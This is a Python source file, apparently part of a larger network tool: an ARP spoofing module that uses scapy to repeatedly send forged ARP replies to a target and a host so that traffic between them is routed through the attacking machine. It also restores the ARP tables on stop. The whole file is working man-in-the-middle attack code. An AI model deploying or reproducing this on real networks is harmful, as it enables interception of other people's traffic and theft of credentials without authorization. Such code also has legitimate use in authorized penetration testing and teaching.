'''
Arp spoofing module. Stateless functions that can be used whenever + Stateful class that manages persistent/async things
'''
import scapy.all as scapy
import threading
from ..data_buffer import DataBuffer





class ArpSpoofer:

    def __init__(self, buffer: DataBuffer, interval=1.0):
        self.buffer = buffer
        self.interval = interval

        self.running = False
        self.timer = None


    # Setup methods

    def tick(self):
        if not self.running:
            return

        #Telling the target that we are the host
        self.spoof(self.target_ip, self.host_ip)

        # Telling the host that we are the target
        self.spoof(self.host_ip, self.target_ip)

        # rerun in a second
        self.timer = threading.Timer(self.interval, self.tick)
        self.timer.start()


    def start(self, target_ip, host_ip):
        # target_ip='192.168.8.137', host_ip='192.168.8.243'
        scapy.conf.verb = 0
        
        if self.running:
            self.buffer.put("arp", "status", ["ARP Spoof is already running"])
            return
        
        self.buffer.put("arp", "status", ["Starting ARP Spoof"])

        self.target_ip = target_ip
        self.host_ip = host_ip

        self.running = True

        self.tick()

                
    def stop(self):

        if self.running == False:
            self.buffer.put("arp", "status", ["ARP Spoof is not running"])
            return

        self.buffer.put("arp", "status", ["Stopping ARP Spoof"])

        self.running = False

        if self.timer:
            self.timer.cancel()

        self.restore(self.target_ip, self.host_ip)
        self.restore(self.host_ip, self.target_ip)
        self.buffer.put("arp", "status", ["Stopped ARP Spoof."])


    # Useful methods

    def get_mac(self, ip: str):
        '''
        return MAC address of any device connected to the network
        If ip is down return None
        '''
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/ arp_request
        answered_list, _ = scapy.srp(arp_request_broadcast, timeout=5)
        self.buffer.put("arp", "ARP Broadcast Request", arp_request_broadcast)
        if answered_list:
            for received in answered_list:
                self.buffer.put("arp", "Answered ARP Request", received[0])
                self.buffer.put("arp", "ARP Response", received[1])
            return answered_list[0][1].src


    def spoof(self, target_ip: str, spoof_ip: str):
        '''
        Spoofs 'target_ip' saying that we are host_ip
        '''
        packet = scapy.ARP(op='is-at', pdst=target_ip, hwdst = self.get_mac(target_ip), psrc = spoof_ip)
        scapy.send(packet, verbose = False)
        self.buffer.put("arp", "Spoofing packet", packet)
        self_mac = scapy.ARP().hwsrc  
        self.buffer.put("arp", "spoofing message", [f"^ Sent to {target_ip}", f"{spoof_ip} is-at {self_mac}"])


    def restore(self, destination_ip, source_ip):
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        packet = scapy.ARP(op = 2, pdst=destination_ip,
                hwdst = destination_mac,
                psrc = source_ip, hwsrc = source_mac)
        self.buffer.put("arp", "Restore packet", packet)
        scapy.send(packet, verbose = False)
        self.buffer.put("arp", "restore message", [f"^ Sent to {destination_ip}", f"{source_ip} is-at {source_mac}"])